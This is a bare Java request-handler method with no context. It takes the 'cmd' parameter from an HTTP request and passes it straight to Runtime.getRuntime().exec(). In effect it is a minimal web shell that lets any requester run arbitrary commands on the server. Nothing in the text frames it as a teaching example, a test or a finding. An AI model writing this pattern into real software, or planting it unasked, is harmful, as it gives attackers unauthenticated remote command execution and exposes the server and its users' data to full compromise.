public void handle(HttpServletRequest request) {
    String cmd = request.getParameter("cmd");
    Runtime.getRuntime().exec(cmd);
}
